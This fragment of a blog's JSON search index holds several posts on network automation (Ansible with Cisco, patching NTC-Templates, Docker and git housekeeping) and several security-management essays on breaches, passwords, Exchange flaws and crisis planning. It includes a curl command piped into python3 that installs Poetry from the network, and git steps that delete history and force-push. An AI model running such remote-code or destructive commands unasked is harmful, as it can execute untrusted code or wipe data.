","cover":"/blog/2022/02/02/automating-palo-alto-networks-firewalls/ansible-with-panw.webp","permalink":"https://www.adainese.it/blog/2022/02/02/automating-palo-alto-networks-firewalls/","title":"Automating Palo Alto Networks firewalls"},{"categories":["automation"],"contents":"I spent a few Twitch sessions speaking about the automation of Cisco devices with Ansible. I don\u0026rsquo;t think Ansible is the best tool and the best way to automate tasks on Cisco devices, but a well-designed and well-documented Ansible playbook can be maintained by non NetDevOps guys too. That\u0026rsquo;s the reason why I decided to design some Ansible playbooks for a service provider a few years ago. During the few Twitch sessions, I reviewed why and how I designed the playbooks to provision brand new Cisco routers and customer lines.\nAnsible with Cisco devices Ansible automates Cisco devices via SSH connection. Ansible sends (types) command, retrieved and parses the output. I call this approach \u0026ldquo;screen scraping\u0026rdquo;. You can find more in a previous post . Today screen scraping is the only approach you can use with many devices, but mind that:\nIt\u0026rsquo;s required that you learn how to debug errors on parsing. If the vendor changes something in the output, your automation playbook/scripts could start failing. I developed a few Ansible playbooks to give you reusable recipes. In the references, you will find all commands and playbooks I used during the Twitch sessions.\nStatic and dynamic inventory In our tests I used a static inventory containing all interesting parameters and credentials. In production you won\u0026rsquo;t do that; there are specific solutions you should evaluate (Ansible vault or external vaults like the one from HashiCorp . I suggest two more approaches: user personal assigned credentials or use environment variables.\nWe also discussed dynamic inventory. If the inventory file is executable , Ansible executes the file and uses the output as an inventory. The inventory format differs from static and dynamic inventory so I played a few to make both works.\nChecking if the configuration has been saved The first playbook I presented is used to check if the running configuration differs from the startup configuration.\nThe playbook can be used to check if the configuration has been saved.\nBasic router configuration and playbook optimization The Ansible Cisco IOS modules retrieve the running configuration every time it\u0026rsquo;s invoked. In a complex playbook, the module could be invoked many times and the result could be very very slow.\nThe second playbook I presented optimizes this behavior: the running configuration is retrieved once, saved into a variable and used later.\nConfiguration modeling In my designing tasks, I\u0026rsquo;m used to spending a lot of time modeling. The third playbook reads parameters from a configuration file . That file should define the entire infrastructure automated by Ansible.\nRoles Designing complex Ansible playbooks requires understanding roles. In short, roles are groups of sub-tasks. In the second Twitch session I provided some Ansible roles for Cisco devices .\nDeleting legacy configurations I develop Ansible playbooks with the idempotency in mind. This property is often guaranteed by Ansible modules, but there are some cases you should double-check. Moreover, there are some cases Ansible cannot allow you to set a specific list of items, because the present items won\u0026rsquo;t be deleted.\nThere are two major examples: DNS and NTP servers. How can we delete unused servers? The manual workflow would be:\ndisplay running configuration; add servers included in the configuration list; delete servers only if they are not included in the configuration list. The role translate this workflow into the Ansible language. The regex_findall function captures lines starting with ip name-server and regex_replace function maintains DNS only in a list format.\nThe when clause checks if all configured servers are in the configuration file.\nQoS modeling and configuration As we did in configuration modeling, we discussed how to model QoS configurations. I provided an example in a dedicated configuration file .\nIn short:\neach customer line has a limited bandwidth (the internet_profiles list); each customer line has a guaranteed bandwidth for voice traffic (the voice_profiles list); the name of internet_profiles and voice_profiles are in the form of \u0026lt;DOWNSTREAM\u0026gt;_\u0026lt;UPSTREAM\u0026gt;; bandwidth is defined by a specific CIR (Committed Information Rate) configuration (the cir dictionary, using the \u0026lt;DOWNSTREAM\u0026gt; and the \u0026lt;UPSTREAM\u0026gt; as keys); traffic is matched by class_maps using COS (Class Of Service). Finally the QoS role configures class and policy maps on the target routers.\nInterface modeling and configuration The previous paragraph prepared the bricks used by the QoS policies applied to the interface. The example configuration file describes how an interface should be configured:\ninterface name; if the interface is enabled; the reserved bandwidth for voice traffic (inbound/outbound); the maximum bandwidth available (inbound/outbound); the customer ID. Because of the huge number of configured interfaces, the Ansible playbook is not targeting all interfaces of all CPEs but it\u0026rsquo;s limited to specific interfaces that changed in the last 24 hours.\nThe interface provisioning role execute some tasks per each interface.\nNested loops in Ansible are not so easy to understand: they require to include external task files and because the inner loop overwrites the outer loop variables, it has to be manually stored in a different name. The main task file should be self-explanatory.\nEvery time one or more interfaces must be configured, the Ansible playbook can be executed using a specific interface configuration file:\n./playbook-2-port_provisioning.yml -i hosts.py --extra-vars config_file=port-config.yml A real case scenario The approach described in this post can be used to automate Internet line provisioning in an Internet provider:\na dynamic inventory script could get the list of all available CPEs; a daily task could prepare a file containing the list of the interfaces to be provisioned; the Ansible interface provisioning playbook could configure or deconfigure all interfaces changed during the last 24 hours. Two more playbooks are available:\nthe Ansible device provisioning playbook to provision and verify the configuration of CPEs; the Ansible interface provisioning playbook targeting all interfaces of all CPEs to verify the configuration (it will take hours to complete). References Ansible for networkers part 1 Ansible for networkers part 2 Ansible for networkers part 3 My Twitch channel Ansible Loops ","cover":"/blog/2022/01/13/automating-cisco-devices-with-ansible/ansible-with-cisco.webp","permalink":"https://www.adainese.it/blog/2022/01/13/automating-cisco-devices-with-ansible/","title":"Automating Cisco devices with Ansible"},{"categories":["automation"],"contents":"A few weeks ago a customer asked me to patch NTC Templates because it has a very old HP Procurve switch. I\u0026rsquo;m used to patching NTC Templates, it\u0026rsquo;s an important tool for my automation tasks. This time I spent a few more minutes and I explained how to do that in a Twitch session. Unfortunately, the session has been lost, but let me summarize the steps.\nConfigure git Configure some git mandatory options:\ngit config --global user.email \u0026#34;andrea.dainese@pm.me\u0026#34; git config --global user.name \u0026#34;Andrea Dainese\u0026#34; Fork, clone, update and merge the latest changes Fork the NTC-Templates GitHub repository via the web and clone the repository locally:\ngit clone https://github.com/dainok/ntc-templates Add the original upstream:\ngit remote add upstream https://github.com/networktocode/ntc-templates git remote -v Delete local changes:\ngit reset --hard Update the local repository:\ngit fetch upstream git merge upstream/master master git rebase upstream/master Update GitHub repository:\ngit push origin master --force Make changes Create a new branch:\ngit checkout -b fix_for_old_hp_procurve Add/modify:\ntemplates: ntc_templates/templates/hp_procurve_show_mac-address.textfsm raw output: tests/hp_procurve/show_mac-address/hp_procurve_show_mac-address2.raw parsed output: tests/hp_procurve/show_mac-address/hp_procurve_show_mac-address2.yml Testing Prepare Python virtual environment:\nsudo apt-get install python3-venv python3-pip python3 -m venv .venv source .venv/bin/activate pip install tox textfsm ntc_templates pyyaml Manual test with a simple Python script:\nimport textfsm import pprint template_file = \u0026#39;ntc_templates/templates/hp_procurve_show_mac-address.textfsm\u0026#39; raw_output_file = \u0026#39;tests/hp_procurve/show_mac-address/hp_procurve_show_mac-address2.raw\u0026#39; with open(template_file) as fd_t, open(raw_output_file) as fd_o: re_table = textfsm.TextFSM(fd_t) parsed_header = re_table.header parsed_output = re_table.ParseText(fd_o.read()) pprint.pprint(parsed_header) pprint.pprint(parsed_output) Or we can use ntc-templates libraries:\nimport pprint from ntc_templates.parse import parse_output platform = \u0026#39;hp_procurve\u0026#39; command = \u0026#39;show mac-address\u0026#39; raw_output_file = \u0026#39;tests/hp_procurve/show_mac-address/hp_procurve_show_mac-address2.raw\u0026#39; data = open(raw_output_file, \u0026#39;r\u0026#39;).read() parsed_output = parse_output(platform=platform, command=command, data=data) pprint.pprint(parsed_output) Final tests:\ncurl -sSL https://install.python-poetry.org | python3 - poetry install poetry run pytest You should get a 100% success.\nCommit and Pull Request Add files, commit and create the pull request from the original repository.\nConclusions Extending and adjusting NTC Templates is a key factor to improve network automation.\nReferences NTC TEMPLATES The submitted Pull Request ","cover":"/blog/2021/12/30/contributing-to-ntc-templates/ntc-templates.webp","permalink":"https://www.adainese.it/blog/2021/12/30/contributing-to-ntc-templates/","title":"Contributing to NTC-Templates"},{"categories":["automation","notes"],"contents":"The following scripts allow cleaning a Docker host, and stopping and deleting containers and images.\nStop all containers:\n#!/bin/bash CONTAINERS=$(docker ps -a | tail -n+2 | cut -d\u0026#34; \u0026#34; -f1) if [ \u0026#34;$CONTAINERS\u0026#34; == \u0026#34;\u0026#34; ]; then exit fi docker stop $CONTAINERS Stop and delete all containers:\n#!/bin/bash CONTAINERS=$(docker ps -a | tail -n+2 | cut -d\u0026#34; \u0026#34; -f1) if [ \u0026#34;$CONTAINERS\u0026#34; == \u0026#34;\u0026#34; ]; then exit fi docker stop $CONTAINERS docker rm $CONTAINERS Delete all unused images:\n#!/bin/bash IMAGES=$(docker images | awk \u0026#39;{ print $3 }\u0026#39;| tail -n+2) if [ \u0026#34;$IMAGES\u0026#34; == \u0026#34;\u0026#34; ]; then exit fi docker rmi $IMAGES \u0026amp;\u0026gt; /dev/null ","cover":"/images/vendors/docker.webp","permalink":"https://www.adainese.it/blog/2021/08/11/clean-a-docker-host/","title":"Clean a Docker host"},{"categories":["automation","notes"],"contents":"To debug a container or to access it, sometimes I need to override the entry point for a specific image:\ndocker run -it --entrypoint /bin/sh [docker_image] ","cover":"/images/vendors/docker.webp","permalink":"https://www.adainese.it/blog/2021/08/10/override-a-docker-container-entry-point/","title":"Override a Docker container entry point"},{"categories":["ciso","personal-security"],"contents":"A few days ago the news broke about a Facebook data breach : 553 million user records that were exposed in 2019 are now circulating freely online. The story caused an uproar because the dataset, which used to be sold for money, is now freely accessible to anyone.\nOver 36 million of the records belong to Italian users and include phone numbers, Facebook IDs, dates of birth, employment details\u0026hellip; the dataset contains executives, MPs, senators, military personnel, law enforcement officers\u0026hellip;\nAlthough the breach dates back to 2019, the fact that it is now public changes the threat: a new category of threat actor has effectively been added.\nThreats to Individuals Regular readers will understand why such a data leak is dangerous for people. Possession or use of the dataset is obviously illegal, but declaring that doesn\u0026rsquo;t stop attacks, stalkers, scams, unscrupulous call centres, or criminal organizations: they now have a convenient phone directory for a large portion of the Italian population.\nThreats to the State While the existence of such a dataset is not new, it\u0026rsquo;s worth reflecting on how it could be used to threaten the State. The database contains a huge number of people who perform, directly or indirectly, critical functions for the State and who have potential physical access to highly sensitive areas.\nMost of these people are not remotely prepared to recognise and handle a digital assault. In a somewhat paranoid—but realistic—scenario that experts in my field consider, one could imagine a massive, coordinated attack targeting these key figures. Because it would be massive, such an attack could be unprecedented and likely highly effective.\nCountermeasures As with any data breach, once the data is out there, containment options are limited. While changing your phone number (the most sensitive exposed field here) is possible, some data—like date of birth—cannot be changed.\nWe must also accept that this type of criminal (misleadingly called \u0026ldquo;hacker\u0026rdquo;) is often a professional seeking to monetise skills, and sometimes even backed by intelligence services. With that in mind, we need to seriously reassess what personal data we publish online: once a datum is online, it can become public, and we must plan accordingly.\nThere are strategies to substantially reduce our exposure. For example, instead of giving our mobile number to every service (often touted as a way to \u0026ldquo;improve security\u0026rdquo;), we should evaluate whether the trade-off is worthwhile given the real risks—this incident shows that it may not be.\nConclusions This story is far from over. In my view, the original impact was underestimated when the breach occurred, and it\u0026rsquo;s still being underestimated now. It\u0026rsquo;s hard to know how those who bought the data used it over the past year; it\u0026rsquo;s far easier—and far more concerning—to imagine how it will be used now that it is public.\n","cover":"/images/categories/ciso.webp","permalink":"https://www.adainese.it/blog/2021/04/04/facebook-data-breach-a-danger-for-state-officers/","title":"Facebook data breach: a danger for state officers"},{"categories":["ciso"],"contents":"I was reflecting with friends and clients on a topic that concerns all of us: the security of connected devices. Whether you are a producer or a user, in private or corporate environments, no one is excluded.\nOften, when I raise these points, people label me as \u0026ldquo;paranoid.\u0026rdquo; And that\u0026rsquo;s true—but for good reasons.\nIn today\u0026rsquo;s cloud hype, many people buy \u0026ldquo;smart\u0026rdquo; devices like connected thermostats without asking themselves what will happen when they become obsolete, no longer updatable, or even unusable. Or without wondering if the real business of certain manufacturers is not the device itself, but the collection and resale of data.\nBut this article is not about privacy. It is about device security and the risks of a hyper-connected world, where technological enthusiasm often runs faster than awareness.\nManaging Critical Systems from a Tablet At the beginning of my career, fixing a fault required dedicated Windows clients and stable connections; mobile access was a rare luxury.\nToday, however, I see water distribution and treatment plants monitored from a tablet, anywhere. With just a few clicks, a technician can check gates and levels. \u0026ldquo;No changes can be made, it\u0026rsquo;s read-only,\u0026rdquo; I\u0026rsquo;m told.\nAnyone in Cybersecurity knows how thin the line is between \u0026ldquo;read-only\u0026rdquo; and \u0026ldquo;full control\u0026rdquo;: sometimes it\u0026rsquo;s just a bit on the server side—or worse, on the client side.\nThat\u0026rsquo;s why incidents like the Florida water plant attack shouldn\u0026rsquo;t surprise us.\nIoT and the Lightness of Industry 4.0 The real mistake behind Industry 4.0 is assuming that those who design industrial devices—always focused on physical safety—are automatically able to handle cybersecurity.\nI\u0026rsquo;ve seen critical networks designed as if they were just \u0026ldquo;cables carrying information,\u0026rdquo; with no regard for network best practices . Consumer-grade switches bought in supermarkets have been used instead of industrial-grade hardware designed for extreme conditions.\nIt\u0026rsquo;s no surprise, then, that devices like those from General Electric revealed serious design flaws that can be easily exploited.\nAt the root, there\u0026rsquo;s always the same issue: lack of awareness. If you\u0026rsquo;ve never looked at systems from an attacker\u0026rsquo;s perspective, you cannot imagine the consequences of poor design choices.\nThe Consumer Side The consumer IoT market is no better. On one side, some vendors are finally integrating security into their development process. On the other, the race to the lowest price floods the market with cheap, poorly designed devices—often with hardcoded backdoors that make them impossible to secure.\nConclusions We are at the beginning of a new era, where security can no longer be ignored.\nEarly signals from both Europe and the U.S. already point in this direction: Cybersecurity as a mandatory requirement for product commercialization. Those who move early will gain a massive competitive advantage.\nThe rest, as often happens, will come running—and unprepared.\n","cover":"/images/categories/ciso.webp","permalink":"https://www.adainese.it/blog/2021/03/25/secure-critical-infrastructure-by-design-and-by-default/","title":"Secure critical infrastructure \"by design\" and \"by default\""},{"categories":["ciso","personal-security"],"contents":"A few months ago, a new \u0026ldquo;collection\u0026rdquo; of data breaches began circulating: someone had taken the time to aggregate cleaned-up data from multiple past breaches into a single consolidated database.\nThe result was a well-organized archive containing more than a billion email addresses and corresponding passwords.\nThis was nothing new, but due to its compact size and structured format, the dataset became particularly interesting to analyze.\nWe Have a Problem While reviewing the file, it became clear that we face a significant issue: many people still do not understand how to manage passwords or the importance of doing so.\nAnalyzing only a small, yet statistically significant portion of the database revealed that the chosen passwords were extremely weak.\nThe problem is serious because the same careless behavior individuals use in their private lives often extends into the workplace. This means that not only are individuals exposing themselves to risks such as identity theft, but they are also exposing their companies to corporate security breaches.\nIt\u0026rsquo;s time to go back to the basics.\nHow Attackers Think About Passwords From the attacker\u0026rsquo;s perspective, the reasoning is straightforward:\nDefine an objective (often financial gain). Assess possible targets that can help achieve that objective. Select targets that optimize effort—those most vulnerable or with the most available information. Execute the attack. With access to public online tools, past data breaches, and marketplaces on the Darknet, attackers can easily identify potential victims. Using exposed passwords and personal information, they gain a significant advantage.\nThe Risks of Weak Passwords By obtaining one or more passwords for a target, an attacker can infer patterns in the target\u0026rsquo;s thinking. They can then attempt to access services using known or predictable credentials.\nThe risks are clear:\nFor individuals: account takeover and identity theft. For organizations: unauthorized access to IT and telecommunication systems (as defined in 615-ter of the Italian penal code). This may sound like a distant threat, but the hyper-digital nature of today\u0026rsquo;s world has led to an exponential increase in account theft reports. For organizations, this often manifests as anomalous login activity.\nHow Not to Choose a Password When creating passwords, many people believe they are being clever, but they often:\nFail to realize how common their logic actually is. Underestimate the likelihood of being targeted. Overlook the consequences of a focused attack. Use trivial passwords (e.g., margherita). Use predictable keyboard sequences (e.g., 1q2w3e4r). Apply \u0026ldquo;creative\u0026rdquo; formulas they believe to be unbreakable (e.g., googleLaVita3Bella). Reuse the same password across multiple sites. We must face reality: every account containing personal data has value. The real question is how much value—and in the case of email or social media accounts, the answer is generally a lot.\nFrom a corporate perspective, requiring users to set at least 12-character alphanumeric passwords with uppercase, lowercase, and special symbols often results in passwords like PizzaMargherita2012!.\nAttacks Against Passwords Let\u0026rsquo;s return to the attacker\u0026rsquo;s perspective. Given the available information:\nIf a target reuses the same password across services, a single data breach exposes all their accounts—including corporate ones. If a target uses an algorithmic pattern, once one or two passwords are leaked, an attacker can deduce the formula and generate future credentials. If a password is simple, brute force attacks (using ordered probability dictionaries) can crack it quickly. In nearly all cases, attackers can compromise at least some accounts.\nChoosing and Managing Passwords Given the threat landscape, each account must be protected by a password that is:\nUnique: otherwise, one breach compromises everything. Complex: otherwise, brute force attacks succeed in minutes. Non-mnemonic: otherwise, attackers can reverse-engineer personal patterns from leaked credentials. This leads to a practical challenge: how do we manage unique, complex, and non-memorable passwords?\nThe answer: password managers. Users only need to remember two things:\nThe master password for the manager\u0026rsquo;s database. Their computer login credentials. Awareness and Training This brings us to the main point: corporate security.\nAfter an anomaly or compromise, users are often asked to change their passwords. But if the old password was Cristina43!, the new one will likely be Cristina44!—a useless change that ensures continued attacker access.\nThis is why training is crucial. Employees should not follow arbitrary rules they don\u0026rsquo;t understand. Instead, they need awareness—recognizing the personal benefits first, which then naturally extend to the company.\nConclusions I, too, once assumed people understood the risks of weak passwords and how to manage them properly. But through conversations, I realized the reality was very different. More importantly, I began to understand the motivations behind their poor choices.\nBy sitting down with people, discussing digital security, real-world consequences, and—most importantly—listening, I was able to design a different strategy. This approach proved far more effective than generic \u0026ldquo;information security awareness\u0026rdquo; video courses.\nThe individuals I had the honor to train not only understood the risks, but also adopted a mindset that allows them to think critically about the digital world. The benefits extended far beyond password security, reaching areas we hadn\u0026rsquo;t even addressed yet.\n","cover":"/blog/2021/03/18/weak-passwords-and-unauthorized-access/password.webp","permalink":"https://www.adainese.it/blog/2021/03/18/weak-passwords-and-unauthorized-access/","title":"Weak Passwords and Unauthorized Access"},{"categories":["ciso"],"contents":"On March 3rd, the Italian CSIRT (Computer Security Incident Response Team) published a bulletin reporting the active exploitation of critical Microsoft Exchange vulnerabilities.\nThat was the moment when companies should have immediately triggered a risk assessment, followed by a business impact analysis and an actionable response plan.\nAssessing the Vulnerability The assessment in this case is straightforward: four severe Microsoft Exchange vulnerabilities (with CVSSv3 scores up to 9.1) that, when chained together, can lead to full server compromise. Specifically, attackers can:\nAccess and exfiltrate user emails Install malware on the server, turning it into a foothold for further attacks The impact should therefore be considered \u0026ldquo;high.\u0026rdquo;\nThe Italian CSIRT also warned that these vulnerabilities were already being exploited. That makes the likelihood of attack against unprotected, internet-exposed Microsoft Exchange servers equally \u0026ldquo;high.\u0026rdquo;\nGiven this risk level, many organizations should have treated patching as an urgent priority.\nProblem Solved? But here\u0026rsquo;s the real issue: the grey zone between the discovery of a vulnerability and the moment when systems are fully patched.\nEven if you deploy the Microsoft Exchange patches quickly, can you really say you acted in time?\nThreat Hunting Vulnerability management should also address this grey zone. Actively analyzing systems to determine whether they have already been compromised—and how—helps reduce the chance of future unpleasant surprises.\nIn this specific case, between March 5th and 7th, most Microsoft Exchange servers worldwide were already targeted using malware designed for remote control.\nSome of these servers received the second phase of the attack in the following two days.\nA Silent Threat Given the speed of the attack\u0026rsquo;s evolution, we can easily predict what happens next: lateral movement across the network, data exfiltration, archive destruction through ransomware, and extortion via data leak threats.\nConclusions The purpose of this article was not to detail vulnerability management procedures, but rather to highlight the importance of embedding threat hunting into the process itself.\nPatch management is not \u0026ldquo;install and forget,\u0026rdquo; nor can it be relegated to \u0026ldquo;quarterly activities.\u0026rdquo; In cases like the one described, action must be both fast and fully aware of today\u0026rsquo;s threat landscape.\n","cover":"/images/categories/ciso.webp","permalink":"https://www.adainese.it/blog/2021/03/10/improvised-vulnerability-management/","title":"Improvised vulnerability management"},{"categories":["automation","notes"],"contents":"Sometimes we realize we committed something that should remain confidential. Or maybe we are ready to publish our open source project and we don\u0026rsquo;t want to publish the entire history too.\nIt\u0026rsquo;s a good time to reinitialize a git repository deleting old history:\nmv .git/config config.git rm -rf .git git init -b master mv config.git .git/config git add . git commit -m \u0026#34;Initial commit\u0026#34; git push -u --force origin master ","cover":"/images/vendors/git.webp","permalink":"https://www.adainese.it/blog/2021/03/07/reinitialize-a-git-repository/","title":"Reinitialize a Git repository"},{"categories":["ciso"],"contents":"A cyber attack against a company can feel very similar to a terrorist attack. Shock, disbelief, fear, and confusion are common emotions in the first hours after the incident is discovered.\nYet those first hours are also the most critical: this is when recovery strategies must be defined, and the ability to stay focused on the objective makes the difference.\nActing on Instinct In any traumatic event, panic reflexes often emerge. These are survival mechanisms deeply rooted in our biology:\nFlee from predators stronger than us, Freeze if there\u0026rsquo;s no time to escape, Fight to protect our children or buy them time to run. But a cyber attack is not a physical threat in the same room. It cannot be fought with instinct. Recognizing panic signals and regaining clarity is essential to focus on the real goal: restoring services and minimizing damage.\nStrong leadership plays a key role here. Leaders must reassure people, channel their energy, and guide them toward the shared objective. Wasting energy fighting colleagues (fight) won\u0026rsquo;t help—the threat is elsewhere, and in fact, it has already passed.\nThis is why many emergency plans, even well designed on paper, fail in reality: rationality often gives way to instinct under pressure.\nTraining as a Discipline In my work, I emphasize the concept of training as a way to build habits: habits that help us react to attacks in a structured, fast, and effective manner.\nTraining prepares people not only by defining procedures but also by training the mind to stay clear-headed when chaos takes over. Repetition conditions the brain to follow precise patterns, especially under stress.\nThis isn\u0026rsquo;t a new invention. I simply borrow from practices already used in the military and from the wisdom of martial arts.\nTraining vs. Education In cybersecurity, the difference between education and training is substantial:\nEducation provides theoretical and practical foundations for building and managing security. Training develops the mindset needed to react effectively when danger strikes. Limiting training to technical staff is a mistake. True resilience involves the entire organization. Some examples:\nTraining non-technical staff to recognize suspicious behavior and stop phishing attacks before they spread. Training security guards to spot weaknesses in their daily routines. Training top management to avoid exposing digital information that could compromise their reputation or physical safety. Training team leaders to manage crises with calm authority, guiding their people with confidence. Final Thoughts The real outcome of training is not just handling a crisis effectively. It is about building a team that is cohesive, aware, and resilient—able to work more effectively together while contributing to the company\u0026rsquo;s overall security posture.\nIn the end, cybersecurity is not just about technology. It\u0026rsquo;s about people—and how prepared they are when the unexpected happens.\n","cover":"/images/categories/ciso.webp","permalink":"https://www.adainese.it/blog/2021/03/03/training-in-managing-cyber-attacks/","title":"Training in managing cyber attacks"},{"categories":["personal-security","ciso"],"contents":"The UK\u0026rsquo;s exit from the European Union provides an opportunity to reflect on our dependency on digital \u0026ldquo;assets\u0026rdquo; that we do not actually own but often take for granted. Examples include IP addresses, domain names, and third-party service accounts (Amazon, eBay, etc.).\nThe following reflections raise questions about how we should assess the risks associated with these assets—questions for which, today, there are no definitive answers.\nIntangible Assets on Loan Companies depend on numerous critical entities tied to their business. While it may seem obvious that an eBay account is not truly owned by the user who registers it, it is less intuitive that domain names and IP addresses cannot actually be purchased outright.\nThis realization should trigger serious discussions about how to manage potential losses. In practice, however, very few organizations address this proactively—except for those that have already been forced to face the problem the hard way.\nLosing a Domain Brexit created an interesting consequence: .eu domains registered by UK-based companies had to be revoked. Since the EU–UK agreement did not account for this, many businesses were forced to rethink their online presence.\nBut the issue goes deeper. Losing a domain can lead to several risks:\nWhoever acquires the expired domain also acquires a portion of its reputation (linked to the website content previously hosted there). They also gain access to all associated email flows, both outbound (impersonating the former owner) and inbound (intercepting messages intended for the previous owner). Among these emails, password reset requests are particularly dangerous: they could grant access to critical accounts tied to the old domain. Account Suspension or Termination Another misunderstood \u0026ldquo;asset\u0026rdquo; is the account with a third-party service provider.\nSeveral companies that recently expanded into online retail through well-known platforms have faced sudden account suspensions. These actions often come without explanation, and with no avenue for appeal. For a business that depends on such a channel, this kind of unilateral suspension can be devastating.\nConclusions Today, it is impossible to build a digital identity—personal or corporate—without relying on entities managed by third parties. But we must acknowledge that this identity rests on foundations we do not own, and therefore could lose at any moment.\nEven if only a small percentage of businesses experience such disruptions, assuming it could never happen to us is a recipe for being completely unprepared.\nWhenever possible, relying on national or at least European providers can provide a more consistent legal framework for dispute resolution. But when we depend on global tech giants outside Europe, we must recognize that our leverage is minimal. Legal action is rarely a realistic option—delays introduced by litigation are simply incompatible with the speed at which the digital world moves.\nReferences Can I keep my .eu domain name after the post-Brexit transition period? Outlawed by Amazon DRM You don\u0026rsquo;t own your Kindle books, Amazon reminds customer Google threatens to block Australia from search engine ","cover":"/images/categories/personal-security.webp","permalink":"https://www.adainese.it/blog/2021/02/24/the-dangers-of-losing-a-domain/","title":"The dangers of losing a domain"},{"categories":["ciso"],"contents":"In this particularly challenging period for companies, many long-ignored or underestimated information security issues are coming to light. Several accelerating factors have put corporate security under pressure; the most relevant include:\nThe need to expose services globally has allowed us to reach international customers with ease, but it has also made us equally accessible to potential attackers worldwide. The availability of electronic money (cryptocurrencies) has made it easy to move capital across the globe without intermediaries such as banks. Low awareness of information security has led to short-sighted decisions, whether due to budget constraints or a lack of skills to properly assess risks. Reliance on third-party cloud resources has expanded the infrastructure, often unknowingly increasing the attack surface. A lack of security assessment during rapid application development has resulted in the release of immature applications—functional but insecure. A pandemic has forced many companies to improvise business continuity plans under tight deadlines. The result of these six factors is an explosive mix, whose effects we are starting to see today—though many remain hidden from mainstream news. I would argue that we are just at the beginning; cybercrime is not only a huge business, but it has also become the \u0026ldquo;fifth dimension\u0026rdquo; of conflict.\nWe can also admit that we have voluntarily ignored some tools, choosing the short path rather than the long-term one:\nInternational certifications such as ISO/IEC 27001 or PCI-DSS have often been pursued merely to obtain the \u0026ldquo;seal,\u0026rdquo; rather than to genuinely add value to the company. GDPR compliance has often focused on the legal aspects, rather than addressing the complexity of IT processes, except in rare cases. A Predictable Failure Recent data breaches have triggered an \u0026ldquo;arms race\u0026rdquo; within companies, hiring security leaders (CISOs) who are expected to solve these challenges without strategy, budget, technical staff, or the necessary commitment. I continue to see job offers where the future CISO reports to the CIO—an evident conflict of interest.\nStarting from the Beginning Management must understand the risk posed by cyberattacks, but often lacks objective data even to consider the possibility. From this awareness, they must decide whether and how to act, delegating responsibility and authority accordingly.\nWhat\u0026rsquo;s needed is awareness, commitment, and a leader capable of having a cross-functional vision—encompassing company processes, risks, and infrastructure—and able to guide employees toward greater information security awareness.\nCompanies often seek a CISO as an integral internal hire, but this approach has drawbacks:\nExperienced figures who can guide information security strategy come at a high cost. CISOs reporting to the CIO often have limited independence and reduced operational capabilities. Internal figures may focus too narrowly on their immediate context, losing sight of the global threat landscape over time, and risk becoming overly political. A Growth Path In my work, I often meet companies that recognize the need to address information security but struggle to develop an effective strategy. Many want to begin a structured growth path—starting with management and training existing staff. The goal is not to outsource the CISO function (which is rarely effective), but to provide the tools to those in the company who are in a position to act.\nThrough this gradual path, clients gain:\nAn understanding of the risks related to their infrastructure. Awareness of how technological choices directly impact business. Improved processes over time, achieving higher overall security. Most importantly, training staff equips them with the skills needed to independently manage security within the company going forward.\n","cover":"/images/categories/ciso.webp","permalink":"https://www.adainese.it/blog/2021/02/19/the-importance-of-the-ciso/","title":"The importance of the CISO"},{"categories":["ciso"],"contents":"Note: This article was originally written a few months ago but never published. I\u0026rsquo;ve now revisited it, adding some updated reflections.\nThis period has taught us many lessons at different levels. Today I want to focus on one in particular: the importance of having a plan for emergencies.\nReferring to an investigative report by Report — \u0026ldquo;Virus and State Secrets\u0026rdquo; — one of the main weaknesses that severely impacted the ability to respond was the absence of an emergency plan that was:\nshared with all the people involved; clear and complete, down to the details; comprehensive, covering a wide range of scenarios. In recent weeks, an additional factor has emerged: the reliability of the supply chain during global crises.\nShared When an emergency occurs, people need to know that a plan exists and that it specifies exactly what actions to take.\nIn Incident Response engagements, I\u0026rsquo;ve often found emergency plans tucked away in drawers—never communicated, let alone practiced.\nBut awareness alone is not enough: people must internalize the plan so they can act as a team, not as individuals driven by panic or anxiety. One of the most important and fascinating aspects of my job is training staff through simulated scenarios with increasing levels of stress.\nBorrowing the concept of Kata from martial arts—later adopted by Toyota in organizational management—we know that only by repeatedly practicing behaviors can we truly internalize them and apply them effectively when it really matters.\nClarity and Completeness An emergency plan must be clear and complete. In high-stress situations, people can\u0026rsquo;t be expected to think calmly and rationally. They must follow a predefined plan that includes every necessary detail.\nExamples of seemingly obvious yet essential information include:\nroles and responsibilities of team members; internal and external communication procedures; how to file a report with law enforcement; how to assess and, if needed, notify a Data Breach to the Data Protection Authority. While some of these steps may appear \u0026ldquo;obvious\u0026rdquo; and easy to look up online, under stress people forget, misjudge, or waste time. In fact, during real crises it\u0026rsquo;s common to see confusion and disorganization—even forgetting basics like the network topology, device locations, or how to access them.\nThis is not about \u0026ldquo;experience.\u0026rdquo; It\u0026rsquo;s about the ability to work under stress.\nHere again, training is key: if the plan clearly defines roles and procedures, and people are trained accordingly, the team is much more likely to perform effectively.\nRealistic training also serves to test how individuals react under pressure. The goal is not that everyone stays calm, but that leadership at all levels—board, line managers, team leaders—can guide and reassure the team in a moment of crisis.\nAs highlighted in Report, chains of command must function, because people need structured points of reference.\nComprehensive Scenarios While it\u0026rsquo;s impossible to anticipate every possible crisis, a good risk assessment helps identify the most critical scenarios. That assessment is the foundation for building targeted emergency plans.\nToday, most cyber threats revolve around ransomware: attackers exfiltrate sensitive data and then attempt to render infrastructure unusable.\nClearly, an attack on a telecom network is very different from an attack on an ICS/OT system, a database, or a file-sharing platform hosting next season\u0026rsquo;s product catalog. Just as the attacks differ, so must the response plans. Reacting to an attempt to poison a water treatment plant requires entirely different actions than handling the outage of a call center\u0026rsquo;s phone system.\nEquipment Availability Preparedness also depends on the scenarios considered in the crisis plan. If scenarios are missing or unrealistic, you\u0026rsquo;ll end up improvising under pressure.\nAs COVID-19 showed, effective operations require tested and ready-to-use equipment. In a health emergency, that might mean stockpiled medical gear and medicines. In a cyber crisis, it means having \u0026ldquo;clean\u0026rdquo; workstations available—functional, charged, with all necessary accessories (network cables, serial adapters, Wi-Fi/4G connectivity, etc.).\nWithout planning, the result is what we saw: governments rushing to procure medical equipment mid-crisis, and companies scrambling to buy laptops to hastily enable remote work.\nSupply Chain Reliability One lesson that wasn\u0026rsquo;t highlighted in Report, but has since become clear, is the fragility of the supply chain during global crises.\nThe slow and uneven distribution of vaccines revealed how suppliers may struggle to meet expectations—or, in some cases, prioritize certain entities over others.\nWhen selecting suppliers, organizations must now consider not only technical and contractual factors but also geopolitical ones: in times of crisis, political decisions may override contractual obligations, prioritizing some regions or countries over others based on commercial, economic, or strategic interests.\nConclusions Observation is essential for understanding the world around us—but to be useful, it must be detached and objective. This allows us to see the many parallels between the physical and digital worlds.\nAs COVID-19 has shown, real-world crises can teach us valuable lessons for cyber crisis management, making companies more resilient to inevitable future challenges.\nThe 